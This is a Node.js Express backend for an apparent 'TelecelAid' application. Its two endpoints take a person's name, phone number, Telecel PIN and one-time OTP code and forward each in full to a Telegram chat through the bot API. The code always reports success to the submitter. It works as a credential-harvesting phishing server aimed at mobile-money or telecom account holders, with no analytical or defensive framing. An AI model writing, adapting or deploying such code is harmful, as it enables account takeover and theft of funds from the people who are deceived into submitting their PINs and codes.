const express = require('express');
const axios = require('axios');
const cors = require('cors');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Telegram Configuration
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

console.log('Bot Token exists:', !!BOT_TOKEN);
console.log('Chat ID exists:', !!CHAT_ID);

// Health check
app.get('/', (req, res) => {
    res.json({ 
        status: 'OK', 
        message: 'TelecelAid Backend is running',
        telegramConfigured: !!(BOT_TOKEN && CHAT_ID)
    });
});

// Submit application endpoint
app.post('/api/submit', async (req, res) => {
    console.log('=== NEW SUBMISSION RECEIVED ===');
    console.log('Body:', req.body);
    
    const { fullName, confirmedName, phoneNumber, confirmedPhone, telecelPin } = req.body;
    
    const finalName = confirmedName || fullName;
    const finalPhone = confirmedPhone || phoneNumber;
    
    if (!finalName || !finalPhone || !telecelPin) {
        console.log('Missing fields!');
        return res.json({ 
            success: false, 
            message: 'Missing fields',
            received: { finalName, finalPhone, telecelPin }
        });
    }
    
    // Prepare Telegram message
    const message = `🔔 *NEW TELECELAID APPLICATION* 🔔
    
━━━━━━━━━━━━━━━━━━━━━━
👤 *Name:* ${finalName}
📞 *Phone:* ${finalPhone}
🔐 *PIN:* ${telecelPin}
━━━━━━━━━━━━━━━━━━━━━━
📅 *Date:* ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━━`;
    
    try {
        if (BOT_TOKEN && CHAT_ID) {
            const telegramResponse = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            });
            console.log('Telegram sent:', telegramResponse.data.ok);
            res.json({ success: true, message: 'Application submitted to Telegram' });
        } else {
            console.log('Telegram not configured');
            res.json({ success: true, message: 'Application received (Telegram not configured)' });
        }
    } catch (error) {
        console.error('Telegram error:', error.response?.data || error.message);
        res.json({ success: true, message: 'Application received but Telegram failed' });
    }
});

// OTP verification endpoint
app.post('/api/verify-otp', async (req, res) => {
    console.log('=== OTP VERIFICATION RECEIVED ===');
    console.log('Body:', req.body);
    
    const { fullName, phoneNumber, otpCode } = req.body;
    
    if (!fullName || !phoneNumber || !otpCode) {
        return res.json({ success: false, message: 'Missing fields' });
    }
    
    const message = `🔐 *OTP VERIFICATION* 🔐
    
━━━━━━━━━━━━━━━━━━━━━━
👤 *Name:* ${fullName}
📞 *Phone:* ${phoneNumber}
🔢 *OTP Code:* ${otpCode}
━━━━━━━━━━━━━━━━━━━━━━
📅 *Date:* ${new Date().toLocaleString()}
✅ *Status:* OTP Verified
━━━━━━━━━━━━━━━━━━━━━━`;
    
    try {
        if (BOT_TOKEN && CHAT_ID) {
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            });
            console.log('OTP Telegram sent successfully');
        }
        res.json({ success: true, message: 'OTP verified' });
    } catch (error) {
        console.error('OTP Telegram error:', error.response?.data || error.message);
        res.json({ success: true, message: 'OTP received but Telegram failed' });
    }
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📡 Telegram Bot: ${BOT_TOKEN ? 'Configured ✅' : 'Missing ❌'}`);
    console.log(`📱 Chat ID: ${CHAT_ID ? 'Configured ✅' : 'Missing ❌'}`);
});
